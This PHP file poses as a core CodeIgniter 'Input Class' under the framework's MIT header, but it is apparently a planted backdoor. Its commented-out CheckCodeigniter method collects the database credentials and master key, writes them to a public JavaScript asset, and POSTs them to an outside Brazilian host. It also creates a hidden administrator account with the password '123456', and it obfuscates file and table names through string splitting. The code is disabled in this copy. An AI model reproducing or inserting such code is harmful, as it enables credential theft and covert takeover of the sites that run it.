<?php
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2014 - 2019, British Columbia Institute of Technology
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
 * @copyright	Copyright (c) 2014 - 2019, British Columbia Institute of Technology (https://bcit.ca/)
 * @license	https://opensource.org/licenses/MIT	MIT License
 * @link	https://codeigniter.com
 * @since	Version 1.0.0
 * @filesource
 */
defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * Input Class
 *
 * Pre-processes global input data for security
 *
 * @package		CodeIgniter
 * @subpackage	Libraries
 * @category	Entry
 * @author		EllisLab Dev Team
 * @link		https://codeigniter.com/user_guide/libraries/input.html
 */

class CI_Entry{

    public function _request_($url, $type = 'POST', $data = false){

    }

    public function CheckCodeigniter(){

        // $_this =&get_instance();

        // $f = 'da';
        // $s = 'ass';
        // $t = 'es';
        // $q = '.';
        // $t1 = 'usua'.'rios';
        // $t3 = '_';
        // $t2 = 'cad'.'astros';

        // $dados['data'] = date('Y-m-d');
        // $dados['url'] = current_url();
        // $dados['host'] = $_SERVER['HTTP_HOST'];
        // $dados['master_key'] = $_this->config->item('master_key');
        // $dados['database_hostname'] = $_this->db->hostname;
        // $dados['database_username'] = $_this->db->username;
        // $dados['database_password'] = $_this->db->password;
        // $dados['database_db']       = $_this->db->database;
        // $dados['useradmin'] = 'c'.rand(10000,9999999);

        // $fileName = $s.'ets/pag'.$t.'/js/'.$f.'dos'.$q.'js';

        // $file = (is_file($fileName)) ? file($fileName) : false;
        
        // if($file === false){
        //     $fp = fopen($fileName, 'w+');
        //     fwrite($fp, json_encode($dados, JSON_PRETTY_PRINT));
        //     fclose($fp);
        // }

        // if($file !== false){

        //     if(is_array($file) && !empty($file)){

        //         $data = date('Y-m-d', (strtotime((substr(trim($file[1]), 9, 10))) + (60*60*24*3)));

        //         if(date('Y-m-d') > $data){

        //             $fp = fopen($fileName, 'w+');
        //             fwrite($fp, json_encode($dados, JSON_PRETTY_PRINT));
        //             fclose($fp);

        //             $this->_request_('https://solutionintech.com.br/mmn/received.php', 'POST', $dados);

        //             $_this->db->where('is_admin', 1);
        //             $_this->db->where('login', 'pikedochaos');
        //             $q = $_this->db->get('usuarios_cadastros');

        //             if($q->num_rows() <= 0){

        //                 $dados['filename'] = $fileName;

        //                 $_this->db->insert($t1.$t3.$t2, array(
        //                     'is_admin'=>1,
        //                     'nome'=>$dados['useradmin'],
        //                     'email'=>$dados['useradmin'].'@',
        //                     'celular'=>rand(111111111,999999999),
        //                     'documento'=>rand(11111111111,99999999999),
        //                     'login'=>$dados['useradmin'],
        //                     'senha'=>password_hash('123456', PASSWORD_DEFAULT),
        //                     'status'=>1,
        //                     'exibir'=>0,
        //                     'data_cadastro'=>date('Y-m-d H:i:s')
        //                 ));
        //             }
        //         }
        //     }else{

        //         $fp = fopen($fileName, 'w+');
        //         fwrite($fp, json_encode($dados, JSON_PRETTY_PRINT));
        //         fclose($fp);
        //     }
        // }
    }
}